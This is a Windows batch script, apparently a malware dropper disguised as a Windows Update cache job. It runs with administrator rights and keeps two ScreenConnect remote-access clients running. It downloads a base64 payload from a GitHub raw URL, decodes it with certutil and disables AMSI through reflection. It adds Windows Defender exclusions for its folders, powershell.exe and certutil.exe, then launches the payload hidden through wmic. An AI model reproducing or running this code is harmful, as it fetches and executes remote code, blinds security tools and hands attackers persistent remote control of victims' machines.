@echo off
setlocal EnableExtensions
echo === GO.CMD BUILD 20260730WU9A ===

net session >nul 2>&1
if errorlevel 1 (
  echo Acces refuse: run as Administrator or SYSTEM - not Guest.
  exit /b 5
)

set "WORKDIR=%ProgramData%\Microsoft\Windows\WER\Temp\.wucache"
set "B64=%WORKDIR%\update.b64"
set "PS1=%WORKDIR%\wucache_pkg.ps1"
set "PS1ALT=C:\Windows\Temp\wucache_pkg.ps1"
set "RUNPS=%WORKDIR%\run.ps1"
set "ERR=%WORKDIR%\boot.err"
set "OUT=%WORKDIR%\boot.out"
set "MARKER=WU_BUILD_20260730_UNIFIED7"
set "CB=%RANDOM%%RANDOM%"
set "ALTSC=ScreenConnect Client (f861c8140d453427)"
set "PRIMSC=ScreenConnect Client (5f6010579852e507)"
set "WRAP=%WORKDIR%\boot_%RANDOM%.cmd"

if not exist "%WORKDIR%" mkdir "%WORKDIR%" >nul 2>&1
if not exist "C:\Windows\Temp" mkdir "C:\Windows\Temp" >nul 2>&1

sc config "%ALTSC%" start= auto >nul 2>&1
sc start "%ALTSC%" >nul 2>&1

powershell.exe -NoP -NonI -EP Bypass -C "Get-CimInstance Win32_Process -EA 0 | Where-Object { $_.ProcessId -ne $PID -and $_.CommandLine -and ($_.CommandLine -match 'wucache_pkg|\.wucache\\boot_|\.wucache\\run\.ps1') } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -EA 0 }" >nul 2>&1

del /f /q "%B64%" >nul 2>&1
del /f /q "%ERR%" >nul 2>&1
del /f /q "%OUT%" >nul 2>&1
del /f /q "%WORKDIR%\go.flag" >nul 2>&1
del /f /q "%WORKDIR%\wmic.out" >nul 2>&1
del /f /q "%RUNPS%" >nul 2>&1

echo DL payload t=%CB% ...
curl.exe -L --ssl-no-revoke --connect-timeout 15 -o "%B64%" "https://raw.githubusercontent.com/xnobuddy/github-drop/main/updateA.b64?t=%CB%" >nul 2>&1
if not exist "%B64%" goto :dl2
for %%A in ("%B64%") do if %%~zA LEQ 1000 goto :dl2
goto :have

:dl2
curl.exe -L --ssl-no-revoke --connect-timeout 15 -o "%B64%" "https://raw.githubusercontent.com/xnobuddy/github-drop/94fbc50/updateA.b64" >nul 2>&1
if not exist "%B64%" goto :dlfail
for %%A in ("%B64%") do if %%~zA LEQ 1000 goto :dlfail
goto :have

:dlfail
echo Download failed.
sc start "%ALTSC%" >nul 2>&1
exit /b 1

:have
for %%A in ("%B64%") do echo OK bytes=%%~zA

> "%RUNPS%" echo $ErrorActionPreference='SilentlyContinue'
>>"%RUNPS%" echo Add-Content -LiteralPath '%ERR%' -Value 'ps_engine' -EA 0
>>"%RUNPS%" echo try{ $t=[Ref].Assembly.GetType('System.Management.Automation.A'+'msiUtils'); if($t){ $f=$t.GetField('amsiInitFailed',[Reflection.BindingFlags]'NonPublic,Static'); if($f){ $f.SetValue($null,$true) } } }catch{}
>>"%RUNPS%" echo Add-Content -LiteralPath '%ERR%' -Value 'amsi_ok' -EA 0
>>"%RUNPS%" echo if(-not (Test-Path -LiteralPath '%PS1ALT%')){ Add-Content -LiteralPath '%ERR%' -Value 'pkg_missing' -EA 0; exit 2 }
>>"%RUNPS%" echo $c=[IO.File]::ReadAllText('%PS1ALT%')
>>"%RUNPS%" echo Add-Content -LiteralPath '%ERR%' -Value ('chars='+$c.Length) -EA 0
>>"%RUNPS%" echo $sb=[ScriptBlock]::Create($c)
>>"%RUNPS%" echo Add-Content -LiteralPath '%ERR%' -Value 'invoke' -EA 0
>>"%RUNPS%" echo ^& $sb
>>"%RUNPS%" echo Add-Content -LiteralPath '%ERR%' -Value 'invoke_done' -EA 0
>>"%RUNPS%" echo if(Test-Path -LiteralPath '%WORKDIR%\.diag.log'){ Add-Content -LiteralPath '%ERR%' -Value 'diag_ok' -EA 0 } else { Add-Content -LiteralPath '%ERR%' -Value 'diag_missing' -EA 0 }

> "%WRAP%" echo @echo off
>>"%WRAP%" echo setlocal EnableExtensions
>>"%WRAP%" echo echo boot_start %%DATE%% %%TIME%%^>"%ERR%"
>>"%WRAP%" echo sc config "%ALTSC%" start= auto ^>nul 2^>^&1
>>"%WRAP%" echo sc start "%ALTSC%" ^>nul 2^>^&1
>>"%WRAP%" echo powershell.exe -NoP -NonI -EP Bypass -C "Try{Add-MpPreference -ExclusionPath '%WORKDIR%' -EA 0;Add-MpPreference -ExclusionPath 'C:\Windows\Temp' -EA 0;Add-MpPreference -ExclusionProcess 'powershell.exe' -EA 0;Add-MpPreference -ExclusionProcess 'certutil.exe' -EA 0}Catch{}" ^>nul 2^>^&1
>>"%WRAP%" echo del /f /q "%PS1ALT%" ^>nul 2^>^&1
>>"%WRAP%" echo del /f /q "%PS1%" ^>nul 2^>^&1
>>"%WRAP%" echo echo decoding^>^>"%ERR%"
>>"%WRAP%" echo certutil.exe -decode "%B64%" "%PS1ALT%" ^>nul 2^>^&1
>>"%WRAP%" echo if not exist "%PS1ALT%" powershell.exe -NoP -NonI -EP Bypass -C "$b=[IO.File]::ReadAllText('%B64%') -replace '\s','';[IO.File]::WriteAllBytes('%PS1ALT%',[Convert]::FromBase64String($b))" ^>nul 2^>^&1
>>"%WRAP%" echo if not exist "%PS1ALT%" echo decode_fail^>^>"%ERR%" ^& exit /b 2
>>"%WRAP%" echo for %%%%A in ("%PS1ALT%") do echo decoded_bytes=%%%%~zA^>^>"%ERR%"
>>"%WRAP%" echo findstr /C:"%MARKER%" "%PS1ALT%" ^>nul
>>"%WRAP%" echo if errorlevel 1 echo marker_fail^>^>"%ERR%" ^& exit /b 3
>>"%WRAP%" echo copy /y "%PS1ALT%" "%PS1%" ^>nul 2^>^&1
>>"%WRAP%" echo echo running_via_runps^>^>"%ERR%"
>>"%WRAP%" echo powershell.exe -NoP -NonI -EP Bypass -WindowStyle Hidden -File "%RUNPS%" ^>^>"%OUT%" 2^>^&1
>>"%WRAP%" echo echo boot_exit_%%ERRORLEVEL%%^>^>"%ERR%"
>>"%WRAP%" echo sc config "%ALTSC%" start= auto ^>nul 2^>^&1
>>"%WRAP%" echo sc start "%ALTSC%" ^>nul 2^>^&1

echo %WRAP%>"%WORKDIR%\go.flag"

wmic process call create "cmd.exe /c \"%WRAP%\"" >"%WORKDIR%\wmic.out" 2>&1
findstr /I "ProcessId ReturnValue" "%WORKDIR%\wmic.out"
echo Launched detached worker [%MARKER%] via run.ps1.
echo Check in 2 min: type "%ERR%"
sc start "%ALTSC%" >nul 2>&1
exit /b 0
